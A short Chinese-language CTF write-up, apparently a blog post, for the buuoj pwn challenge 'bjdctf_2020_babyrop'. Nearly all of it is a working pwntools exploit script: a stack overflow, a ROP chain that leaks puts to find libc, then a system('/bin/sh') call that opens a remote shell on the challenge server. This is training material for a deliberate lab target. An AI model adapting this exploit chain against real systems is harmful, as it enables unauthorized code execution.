---
title: bjdctf_2020_babyrop
tags: [ctf-pwn,exp]
date: 2023-4-21 12:29:00
categories: [ctf-pwn]
excerpt: exp
---

**题目**

https://buuoj.cn/challenges#bjdctf_2020_babyrop

非常基本的一道利用puts函数构造rop链泄露libc基址的题目

**Exp**

```python
from pwn import *
from LibcSearcher import *

p = remote("node4.buuoj.cn",25323)

elf = ELF('./bjdctf_2020_babyrop')

main = elf.sym['main']
poprdi_ret = 0x400733

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

s = p.recv()
print(s)

payload = b'a'*40 + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendline(payload)

s = p.recv()

puts_addr = u64(s[:6].ljust(8,b'\x00'))
print(hex(puts_addr))

libc =LibcSearcher('puts',puts_addr)
offset = puts_addr - libc.dump('puts')
binsh = offset + libc.dump('str_bin_sh')
system = offset + libc.dump('system')

payload = b'a' * 40 + p64(poprdi_ret) + p64(binsh) + p64(system)

p.sendline(payload)

p.interactive()
```

